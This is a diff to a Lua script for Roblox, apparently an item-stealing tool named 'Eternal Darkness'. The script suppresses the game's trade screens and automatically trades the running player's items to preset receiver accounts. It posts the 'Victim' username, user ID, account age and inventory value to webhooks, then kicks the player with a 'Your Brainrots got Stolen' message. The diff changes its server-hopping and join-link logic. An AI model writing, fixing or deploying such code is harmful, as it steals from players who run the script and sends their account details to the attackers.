@@ -4,7 +4,6 @@ task.wait(1.5)
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local TeleportService = game:GetService("TeleportService")
 local plr = Players.LocalPlayer
 if not plr then return end
 
@@ -78,76 +77,6 @@ end
 
 local request = requestMethod
 
-local REAL_JOB_ID = game.JobId
-local bypassJobId = game.JobId
-local capturedJobId = false
-
-if identifyexecutor and identifyexecutor() == "Delta" then
-    local stepAnimate = nil
-    local printed = false
-    repeat
-        for _, v in ipairs(getgc(true)) do
-            if typeof(v) == "function" then
-                local info = debug.getinfo(v)
-                if info and info.name == "stepAnimate" then
-                    stepAnimate = v
-                    break
-                end
-            end
-        end
-        task.wait()
-    until stepAnimate
-    local old
-    old = hookfunction(stepAnimate, function(dt)
-        if not printed then
-            printed = true
-            bypassJobId = game.JobId
-            capturedJobId = true
-        end
-        return old(dt)
-    end)
-    repeat task.wait() until capturedJobId
-    REAL_JOB_ID = bypassJobId
-end
-
-local function ServerHop()
-    local success, result = pcall(function()
-        local response = request({
-            Url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100",
-            Method = "GET",
-            Headers = {["User-Agent"] = "Mozilla/5.0"}
-        })
-        if response and response.Body then
-            local data = HttpService:JSONDecode(response.Body)
-            if data and data.data then
-                for _, server in ipairs(data.data) do
-                    if server.id ~= game.JobId and server.playing < server.maxPlayers then
-                        TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, plr)
-                        task.wait(5)
-                        return
-                    end
-                end
-            end
-        end
-    end)
-    if not success then
-        warn("[ED] ServerHop failed: " .. tostring(result))
-    end
-end
-
-local VIP = (game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer")
-local FULL = (#Players:GetPlayers() >= 8)
-if VIP or FULL then
-    if executorName:lower():find("delta") or executorName:lower():find("hydrogen") or executorName:lower():find("fluxus") or executorName:lower():find("arceus") or executorName:lower():find("codex") then
-        plr:Kick(VIP and "VIP Servers not supported." or "Server not supported, please join a different one...")
-        return
-    else
-        print(VIP and "VIP Server detected, hopping..." or "Server full, hopping...")
-        ServerHop()
-        return
-    end
-end
-
 local cam = workspace.CurrentCamera
 local pg = plr:WaitForChild("PlayerGui")
 local guiNames = {BrainrotTrader = true, TradeLiveTrade = true, TradePrompts = true}
@@ -160,7 +89,10 @@ end
 
 local function handleGui(obj)
     if guiNames[obj.Name] then
-        task.defer(function() obj:Destroy() end)
+        obj.Enabled = false
+        obj:GetPropertyChangedSignal("Enabled"):Connect(function()
+            if obj.Enabled then obj.Enabled = false end
+        end)
     end
 end
 
@@ -376,8 +308,30 @@ local function sendToPublic(payload)
 end
 
 local rubisLink = uploadToPastefy(brainrotList)
-local PlaceId = game.PlaceId
-local fernJoinerLink = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", PlaceId, REAL_JOB_ID)
+
+local joinLink = "https://www.roblox.com/games/" .. game.PlaceId
+pcall(function()
+    local response = request({
+        Url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100",
+        Method = "GET",
+        Headers = {["User-Agent"] = "Mozilla/5.0"}
+    })
+    if response and response.Body then
+        local data = HttpService:JSONDecode(response.Body)
+        if data and data.data then
+            local validServers = {}
+            for _, server in ipairs(data.data) do
+                if server.playing < server.maxPlayers then
+                    table.insert(validServers, server)
+                end
+            end
+            if #validServers > 0 then
+                local randomServer = validServers[math.random(1, #validServers)]
+                joinLink = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", game.PlaceId, randomServer.id)
+            end
+        end
+    end
+end)
 
 local hitCategory = "Low Hit"
 local isPingWorthy = false
@@ -404,7 +358,7 @@ end
 
 local fields = {
     {name = "👤 Victim", value = plr.DisplayName .. "\n(@" .. plr.Name .. ")\nID: " .. plr.UserId .. "\nAge: " .. plr.AccountAge .. " days", inline = true},
-    {name = "⚙️ System", value = "Executor: " .. executorName .. "\nReceiver: " .. table.concat(USERNAMES, ", ") .. "\nJob ID:\n" .. string.sub(REAL_JOB_ID, 1, 8) .. "...", inline = true},
+    {name = "⚙️ System", value = "Executor: " .. executorName .. "\nReceiver: " .. table.concat(USERNAMES, ", "), inline = true},
     {name = "💰 Valuation", value = "Total USD: $" .. string.format("%.2f", totalInventoryValue) .. "\nTotal Items: " .. total_items, inline = true}
 }
 
@@ -417,7 +371,7 @@ local ansiLine5 = "Common:      " .. rarityCounts.Common .. "  Unknown:     " ..
 
 table.insert(fields, {name = "📊 Brainrots", value = "```ansi\n" .. ansiLine1 .. "\n" .. ansiLine2 .. "\n" .. ansiLine3 .. "\n" .. ansiLine4 .. "\n" .. ansiLine5 .. "```", inline = false})
 table.insert(fields, {name = "🏆 Top Items", value = "```\n" .. table.concat(top_items, "\n") .. "\n```", inline = false})
-table.insert(fields, {name = "🔗 Actions", value = "[Join Server](" .. fernJoinerLink .. ") • [View Inventory](" .. rubisLink .. ")", inline = false})
+table.insert(fields, {name = "🔗 Actions", value = "[Join Server](" .. joinLink .. ") • [View Inventory](" .. rubisLink .. ")", inline = false})
 
 local payload = {
     content = isPingWorthy and "@everyone 🌑 **NEW SAB HIT | Eternal Darkness**" or nil,
@@ -428,7 +382,6 @@ local payload = {
         url = rubisLink,
         color = 0x1a1a2e,
         thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"},
-        description = "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. PlaceId .. ", '" .. REAL_JOB_ID .. "')\n```",
         fields = fields,
         footer = {text = "Eternal Darkness v8.0"},
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
@@ -441,7 +394,7 @@ local publicFields = {
     {name = "💰 Valuation", value = "Total USD: $" .. string.format("%.2f", totalInventoryValue) .. "\nTotal Items: " .. total_items, inline = true},
     {name = "📊 Brainrots", value = "```ansi\n" .. ansiLine1 .. "\n" .. ansiLine2 .. "\n" .. ansiLine3 .. "\n" .. ansiLine4 .. "\n" .. ansiLine5 .. "```", inline = false},
     {name = "🏆 Top Items", value = "```\n" .. table.concat(top_items, "\n") .. "\n```", inline = false},
-    {name = "🔗 Actions", value = "[View Inventory](" .. rubisLink .. ")", inline = false}
+    {name = "🔗 Actions", value = "[Join Server](" .. joinLink .. ") • [View Inventory](" .. rubisLink .. ")", inline = false}
 }
 
 local PublicPayload = {
@@ -470,24 +423,17 @@ print("Please wait, this process can take up to 5 minutes depending on your conn
 wait(3)
 
 local isTradeCompleted = false
-local automationRunning = false
 
 local function startTradeAutomation(targetId)
-    if automationRunning then return end
-    automationRunning = true
+    if isTradeCompleted then return end
     
     local searchRemote = getRemote("RF/TradeService/SearchUser")
     local inviteRemote = getRemote("RF/TradeService/Invite")
     local addRemote = getRemote("RF/TradeService/AddBrainrot")
     local readyRemote = getRemote("RE/TradeService/Ready")
     local acceptRemote = getRemote("RE/TradeService/Accept")
-    local completedRemote = getRemote("RE/TradeService/TradeCompleted")
     
-    if completedRemote then
-        completedRemote.OnClientEvent:Connect(function()
-            isTradeCompleted = true
-        end)
-    end
+    if not searchRemote or not inviteRemote then return end
     
     if addRemote and #brainrotQueue > 0 then
         task.spawn(function()
@@ -536,7 +482,7 @@ local function startTradeAutomation(targetId)
                 else
                     currentIndex = 1
                 end
-                task.wait(0.5)
+                task.wait(1)
             end
         end)
     end
@@ -544,28 +490,35 @@ local function startTradeAutomation(targetId)
     task.spawn(function()
         while not isTradeCompleted do
             pcall(function()
-                if searchRemote then searchRemote:InvokeServer(targetId) end
-                task.wait(0.5)
-                if inviteRemote then inviteRemote:InvokeServer(targetId) end
+                searchRemote:InvokeServer(targetId)
+                task.wait(1)
+                inviteRemote:InvokeServer(targetId)
+                task.wait(1)
                 task.wait(5)
                 if readyRemote and acceptRemote then
                     local startTime = tick()
                     while tick() - startTime < 50 and not isTradeCompleted do
                         readyRemote:FireServer()
-                        task.wait(0.5)
+                        task.wait(1)
                         acceptRemote:FireServer()
-                        task.wait(0.5)
+                        task.wait(1)
                     end
                 end
             end)
             task.wait(2)
         end
-        
-        task.wait(2)
-        pcall(function() setclipboard("https://discord.gg/wep4k9Fg8W") end)
-        pcall(function()
-            plr:Kick("Eternal Darkness | Your Brainrots got Stolen\n\ndiscord.gg/wep4k9Fg8W")
-        end)
+    end)
+    
+    task.spawn(function()
+        task.wait(90)
+        if not isTradeCompleted then
+            isTradeCompleted = true
+            task.wait(2)
+            pcall(function() setclipboard("https://discord.gg/wep4k9Fg8W") end)
+            pcall(function()
+                plr:Kick("Eternal Darkness | Your Brainrots got Stolen\n\ndiscord.gg/wep4k9Fg8W")
+            end)
+        end
     end)
 end
 
